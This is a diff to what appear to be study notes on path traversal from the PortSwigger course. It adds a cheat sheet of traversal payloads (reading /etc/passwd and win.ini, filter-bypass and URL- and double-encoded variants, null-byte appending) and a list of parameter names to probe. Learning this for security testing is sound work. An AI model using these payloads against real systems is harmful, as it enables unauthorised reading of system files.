@@ -1,7 +1,23 @@
 # Path Traversal
 
-> PortSwigger topic: https://portswigger.net/web-security/file-path-traversal
+> **PortSwigger topic:** https://portswigger.net/web-security/file-path-traversal
 > Also called directory traversal.
+
+## Cheat sheet
+
+User-controlled filename → filesystem read → no sanitization. Use `../` to escape the intended directory.
+
+**Try these payloads first:**
+
+- `../../../etc/passwd` — Linux baseline
+- `..\..\..\windows\win.ini` — Windows
+- `....//....//etc/passwd` — single-pass `../` filter bypass
+- `%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd` — URL-encoded
+- `%252e%252e%252f...` — double-encoded
+- `/etc/passwd` — absolute path if app prepends a base dir
+- Append `%00` (null byte) on legacy PHP / Java with appended extensions
+
+**Hunt for:** `?file=`, `?image=`, `?doc=`, `?download=`, `?page=`. Anything filename-shaped.
 
 ## My version
 
